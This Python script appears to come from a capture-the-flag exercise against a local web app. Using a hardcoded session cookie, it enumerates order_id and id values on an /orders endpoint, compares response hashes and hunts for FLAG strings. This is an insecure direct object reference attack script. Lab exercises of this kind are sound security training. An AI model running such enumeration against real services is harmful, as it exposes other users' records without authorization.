import requests
import hashlib
import re

# Configuration
BASE_URL = "http://127.0.0.1:32941"
ORDERS_ENDPOINT = "/orders"
COOKIE_SESSION = "eyJ1c2VyX2lkIjoxMDAzMn0.aVLQrQ.UwvtLfYsm3gR5lOsx-SapY2s4r0"

# Setup session
session = requests.Session()
session.cookies.set('session', COOKIE_SESSION)

# Helper to extract response characteristics
def get_response_chars(resp):
    """Extract key characteristics from response."""
    return {
        'status_code': resp.status_code,
        'content_length': len(resp.content),
        'body_hash': hashlib.md5(resp.content).hexdigest(),
        'has_flag': bool(re.search(r'FLAG\{[^}]+\}', resp.text)),
        'flags': re.findall(r'FLAG\{[^}]+\}', resp.text),
        'response': resp.text
    }

print(f"[*] Enumerating {ORDERS_ENDPOINT}?order_id=0-1000")

# Test order_id parameter
all_results = {}
anomalies = {}
flag_found = False

# Establish baseline with order_id=0
print("\n[*] Establishing baseline...")
resp = session.get(f"{BASE_URL}{ORDERS_ENDPOINT}?order_id=0", timeout=10)
baseline = get_response_chars(resp)
all_results[0] = baseline

if baseline['has_flag']:
    print(f"[!] FLAG FOUND in baseline: {baseline['flags']}")
    flag_found = True
    anomalies[0] = baseline

print(f"[BASELINE] Status: {baseline['status_code']} | Size: {baseline['content_length']}B | Hash: {baseline['body_hash']}")

# Enumerate order_id 1-1000
print("\n[*] Testing order_id values 1-1000...")
for order_id in range(1, 1001):
    try:
        resp = session.get(f"{BASE_URL}{ORDERS_ENDPOINT}?order_id={order_id}", timeout=5)
        chars = get_response_chars(resp)
        all_results[order_id] = chars
        
        is_anomaly = False
        if chars['body_hash'] != baseline['body_hash']:
            is_anomaly = True
        if chars['has_flag']:
            print(f"[!] FLAG at order_id={order_id}: {chars['flags']}")
            flag_found = True
        
        if is_anomaly:
            anomalies[order_id] = chars
        
        if order_id % 200 == 0:
            print(f"[*] Progress: {order_id}/1000")
    
    except Exception as e:
        print(f"[!] Error at order_id={order_id}: {e}")

# Test 'id' parameter (first 100 values as quick check)
print("\n[*] Testing 'id' parameter (0-100)...")
id_anomalies = {}
for test_id in range(0, 101):
    try:
        resp = session.get(f"{BASE_URL}{ORDERS_ENDPOINT}?id={test_id}", timeout=5)
        chars = get_response_chars(resp)
        
        if chars['body_hash'] != baseline['body_hash']:
            id_anomalies[test_id] = chars
            if chars['has_flag']:
                print(f"[!] FLAG with 'id'={test_id}: {chars['flags']}")
                flag_found = True
    except Exception as e:
        print(f"[!] Error with 'id'={test_id}: {e}")

# Summary
print("\n" + "="*60)
print(f"[*] Total tested: {len(all_results)} order_id values")
print(f"[*] Anomalies found: {len(anomalies)}")
print(f"[*] 'id' parameter anomalies: {len(id_anomalies)}")
print(f"[*] FLAG found: {flag_found}")

if anomalies:
    print("\n[*] anomaly order_id -> characteristics:")
    for oid, data in list(anomalies.items())[:10]:
        print(f"  {oid}: status={data['status_code']}, size={data['content_length']}B, flags={len(data['flags'])}")

if flag_found:
    print("\n[!] FLAG RESPONSES:")
    for oid, data in anomalies.items():
        if data['has_flag']:
            print(f"\norder_id={oid}")
            print("-" * 40)
            print(data['response'])

print(f"\n[RESULTS] anomalies={len(anomalies)}, id_anomalies={len(id_anomalies)}, flag_found={flag_found}")
